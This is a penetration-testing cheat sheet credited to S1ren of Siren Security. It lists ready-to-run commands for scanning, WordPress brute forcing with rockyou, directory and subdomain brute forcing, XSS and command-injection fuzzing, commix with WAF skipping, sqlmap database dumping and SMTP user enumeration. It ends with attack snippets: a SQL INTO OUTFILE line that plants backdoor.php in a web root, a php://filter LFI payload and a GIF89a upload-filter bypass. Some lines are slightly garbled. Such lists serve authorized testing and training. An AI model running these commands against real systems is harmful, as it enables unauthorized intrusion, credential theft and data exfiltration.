# Common Tools
### Credit: S1ren@sirensecurity.io [Original Source](https://sirensecurity.io/blog/common/)

## Nmap
```bash
nmap -p- -sT -sV -A $IP
nmap -p- -sC -sV $IP --open
nmap -p- --script=vuln $IP
```
### HTTP-Methods
```bash
nmap  --script http-methods --script-args http-methods.url-path='/website' 
      --script smb-enum-shares
nmap -p80,443 --script=http-methods  --script-args http-methods.url-path='/directory/goes/here'
```
### sed IPs:
```bash
grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' FILE
```

## WPScan & SSL
```bash
wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t --enumerate u
```
### WPScan Brute Forceing:
```bash
wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt
```

### Aggressive Plugin Detection:
```bash
wpscan --url $URL --enumerate p --plugins-detection aggressive
```

## Nikto with SSL and Evasion

```bash
nikto --host $IP -ssl -evasion 1
```
[See Evasion Modalities](https://www.kali.org/tools/nikto/)

## DNS/recon
```bash
dnsrecon –d yourdomain.com
```

### Gobuster directory
```bash
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30
```
### Gobuster files
```bash
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -k -t 30
```

### Gobuster for SubDomain brute forcing:
```bash
gobuster dns -d domain.org -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
```
"WARNING: Make sure any DNS name you find resolves to an in-scope address before you test it"

### Extract IPs from a text file.
```bash
grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' nmapfile.txt
```

### Wfuzz XSS Fuzzing
```bash
wfuzz -c -z file,/opt/SecLists/Fuzzing/XSS/XSS-BruteLogic.txt "$URL"
wfuzz -c -z file,/opt/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt "$URL"
```
### COMMAND INJECTION WITH POST DATA
```bash
wfuzz -c -z file,/opt/SecLists/Fuzzing/command-injection-commix.txt -d "doi=FUZZ" "$URL"
```

### Test for Parameter Existence!
```bash
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt "$URL"
```

### AUTHENTICATED FUZZING DIRECTORIES
```bash
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -d "SESSIONID=value" "$URL"
```

### AUTHENTICATED FILE FUZZING:
```bash
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -d "SESSIONID=value" "$URL"
```

### FUZZ Directories:
```bash
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL"
```

### FUZZ FILES:
```bash
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
|
LARGE WORDS:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-words.txt --hc 404 "$URL"
|
USERS:
wfuzz -c -z file,/opt/SecLists/Usernames/top-usernames-shortlist.txt --hc 404,403 "$URL"
```

### Command Injection with commix, ssl, waf, random agent.
```bash
commix --url="https://supermegaleetultradomain.com?parameter=" --level=3 --force-ssl --skip-waf --random-agent
```

### SQLMap
```bash
sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl
sqlmap -u $URL --threads=2 --time-sec=10 --level=4 --risk=3 --dump
```


## Social Recon
### theharvester
```bash
theharvester -d domain.org -l 500 -b google
```



## SMTP User Enumeration
### smtp-user-enum
```bash
smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
```

===Command Execution Verification - [Ping check]
tcpdump -i any -c5 icmp
====
#Check Network
netdiscover /r 0.0.0.0/24
====
#INTO OUTFILE D00R
SELECT “” into outfile “/var/www/WEROOT/backdoor.php”;
====
LFI?
#PHP Filter Checks.
php://filter/convert.base64-encode/resource=
====
UPLOAD IMAGE?
GIF89a1

S1REN'S COMMON IMPLIES THAT YOU HAVE SECLISTS IN /opt/SecLists/
https://github.com/danielmiessler/SecLists


